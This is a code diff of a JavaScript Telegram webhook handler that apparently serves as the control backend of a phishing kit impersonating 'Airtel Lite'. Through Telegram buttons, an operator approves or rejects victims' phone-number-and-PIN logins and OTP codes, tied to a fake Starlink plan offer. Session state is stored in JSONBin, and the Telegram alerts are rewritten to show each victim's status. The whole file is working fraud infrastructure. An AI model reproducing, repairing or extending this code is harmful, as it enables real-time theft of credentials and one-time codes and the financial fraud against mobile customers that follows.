@@ -1,4 +1,6 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.VITE_TELEGRAM_BOT_TOKEN || '';
+const JSONBIN_KEY = process.env.JSONBIN_KEY || '';
+const JSONBIN_ID = process.env.JSONBIN_ID || '';
 
 const FETCH_HEADERS = {
   'Content-Type': 'application/json',
@@ -15,7 +17,6 @@ export default async function handler(req, res) {
     return res.status(200).end();
   }
 
-  // Health check for webhook
   if (req.method === 'GET') {
     return res.status(200).json({ status: 'Telegram Webhook is operational.' });
   }
@@ -27,7 +28,6 @@ export default async function handler(req, res) {
   try {
     const update = req.body || {};
 
-    // 1. INLINE BUTTON CALLBACK QUERY
     if (update.callback_query) {
       const cq = update.callback_query;
       const callbackData = cq.data || '';
@@ -36,9 +36,8 @@ export default async function handler(req, res) {
       const chatId = cq.message?.chat?.id;
 
       let recordId = '';
-      let actionType = ''; // 'approve_login' | 'reject_login' | 'approve_otp' | 'reject_otp'
+      let actionType = '';
 
-      // Parse callback data
       if (callbackData.startsWith('approve_login_')) {
         recordId = callbackData.replace('approve_login_', '');
         actionType = 'approve_login';
@@ -53,117 +52,83 @@ export default async function handler(req, res) {
         actionType = 'reject_otp';
       }
 
-      console.log(`[Webhook] Action: ${actionType}, Record ID: ${recordId}`);
+      console.log(`[Webhook] Action: ${actionType}, Session: ${recordId}`);
 
       if (recordId) {
-        // Update server-side state via set-status endpoint
-        try {
-          const setStatusRes = await fetch(`${req.protocol}://${req.get('host')}/api/telegram/set-status`, {
+        // Update JSONBin directly
+        if (JSONBIN_KEY && JSONBIN_ID) {
+          try {
+            // Read current bin
+            const readRes = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
+              headers: { 'X-Master-Key': JSONBIN_KEY, 'X-Bin-Meta': 'false' }
+            });
+
+            let currentData = {};
+            if (readRes.ok) {
+              currentData = await readRes.json();
+            }
+
+            // Update session status
+            const sessionKey = `airtel_${recordId}`;
+            if (actionType === 'approve_login') {
+              currentData[sessionKey] = { loginStatus: 'approved', lastUpdated: Date.now() };
+            } else if (actionType === 'reject_login') {
+              currentData[sessionKey] = { loginStatus: 'rejected', lastUpdated: Date.now() };
+            } else if (actionType === 'approve_otp') {
+              currentData[sessionKey] = { otpStatus: 'approved', lastUpdated: Date.now() };
+            } else if (actionType === 'reject_otp') {
+              currentData[sessionKey] = { otpStatus: 'rejected', lastUpdated: Date.now() };
+            }
+
+            // Write back to JSONBin
+            await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, {
+              method: 'PUT',
+              headers: { 'Content-Type': 'application/json', 'X-Master-Key': JSONBIN_KEY },
+              body: JSON.stringify(currentData)
+            });
+
+            console.log('[Webhook] Status updated in JSONBin for:', recordId);
+          } catch (e) {
+            console.error('[Webhook] JSONBin update failed:', e);
+          }
+        }
+
+        // Answer callback and update message
+        let alertMsg = 'Action enregistrée';
+        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée !';
+        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée.';
+        if (actionType === 'approve_otp') alertMsg = '✅ OTP validé !';
+        if (actionType === 'reject_otp') alertMsg = '❌ OTP rejeté.';
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ callback_query_id: callbackId, text: alertMsg, show_alert: true })
+        });
+
+        if (msgId && chatId) {
+          let updatedText = '';
+          if (actionType === 'approve_login') {
+            updatedText = `🔴 <b>AIRTEL LITE - CONNEXION VALIDÉE</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🟢 STATUT: ✅ APPROUVÉ`;
+          } else if (actionType === 'reject_login') {
+            updatedText = `🔴 <b>AIRTEL LITE - CONNEXION REFUSÉE</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🔴 STATUT: ❌ REJETÉ`;
+          } else if (actionType === 'approve_otp') {
+            updatedText = `🔐 <b>OTP VALIDÉ</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🟢 STATUT: ✅ APPROUVÉ`;
+          } else if (actionType === 'reject_otp') {
+            updatedText = `🔐 <b>OTP REJETÉ</b>\n\n🆔 Session: <code>${recordId}</code>\n\n🔴 STATUT: ❌ REJETÉ`;
+          }
+
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              sessionId: recordId,
-              loginStatus: actionType === 'approve_login' ? 'approved' : actionType === 'reject_login' ? 'rejected' : undefined,
-              otpStatus: actionType === 'approve_otp' ? 'approved' : actionType === 'reject_otp' ? 'rejected' : undefined,
-            }),
+              chat_id: chatId,
+              message_id: msgId,
+              text: updatedText,
+              parse_mode: 'HTML',
+              reply_markup: { remove_keyboard: true }
+            })
           });
-          console.log('[Webhook] Status updated via set-status:', setStatusRes.ok);
-        } catch (e) {
-          console.warn('[Webhook] Failed to update status via set-status:', e);
-        }
-
-        // Answer Telegram callback query immediately
-        let alertMsg = 'Action enregistrée';
-        if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
-        if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée (Code PIN ou numéro incorrect).';
-        if (actionType === 'approve_otp') alertMsg = '✅ Code OTP validé avec succès ! Forfait activé.';
-        if (actionType === 'reject_otp') alertMsg = '❌ Code OTP rejeté ou invalide.';
-
-        const answerRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            callback_query_id: callbackId,
-            text: alertMsg,
-            show_alert: true,
-          }),
-        });
-
-        const answerData = await answerRes.json();
-        if (!answerData.ok) {
-          console.error('[Webhook] answerCallbackQuery failed:', answerData);
-        }
-
-        // Update message text in Telegram AND REMOVE BUTTONS
-        if (msgId && chatId) {
-          let updatedText = '';
-          const phone = recordId.includes('_') ? recordId.split('_')[1] : 'Inconnu';
-          const country = 'Airtel Africa';
-          const planName = 'Forfait Airtel Starlink';
-          const planPrice = '$1.49';
-
-          if (actionType === 'approve_login') {
-            updatedText =
-              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
-              `🌍 <b>Pays:</b> ${country}\n` +
-              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
-              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
-              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
-              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
-              `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
-              `<i>L'utilisateur accède actuellement à la saisie du code OTP.</i>`;
-          } else if (actionType === 'reject_login') {
-            updatedText =
-              `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
-              `🌍 <b>Pays:</b> ${country}\n` +
-              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
-              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
-              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
-              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
-              `🔴 <b>STATUT: ❌ REJETÉ (CODE PIN OU NUMÉRO INCORRECT)</b>\n` +
-              `<i>L'utilisateur a été notifié de l'erreur sur son écran.</i>`;
-          } else if (actionType === 'approve_otp') {
-            updatedText =
-              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
-              `🌍 <b>Pays:</b> ${country}\n` +
-              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
-              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
-              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
-              `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
-              `🟢 <b>STATUT: ✅ OTP CONFIRMÉ ET VALIDÉ</b>\n` +
-              `<i>Paiement réussi et forfait Starlink activé !</i>`;
-          } else if (actionType === 'reject_otp') {
-            updatedText =
-              `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
-              `🌍 <b>Pays:</b> ${country}\n` +
-              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
-              `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
-              `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
-              `⏰ <b>Heure refus:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
-              `🔴 <b>STATUT: ❌ OTP REJETÉ / INVALIDE</b>`;
-          }
-
-          if (updatedText) {
-            console.log('[Webhook] Updating message and removing buttons for:', recordId);
-            const editRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chatId,
-                message_id: msgId,
-                text: updatedText,
-                parse_mode: 'HTML',
-                reply_markup: { remove_keyboard: true },
-              }),
-            });
-
-            const editData = await editRes.json();
-            if (!editData.ok) {
-              console.error('[Webhook] editMessageText failed:', editData);
-            } else {
-              console.log('[Webhook] Message updated successfully, buttons removed');
-            }
-          }
         }
 
         return res.status(200).json({ ok: true });
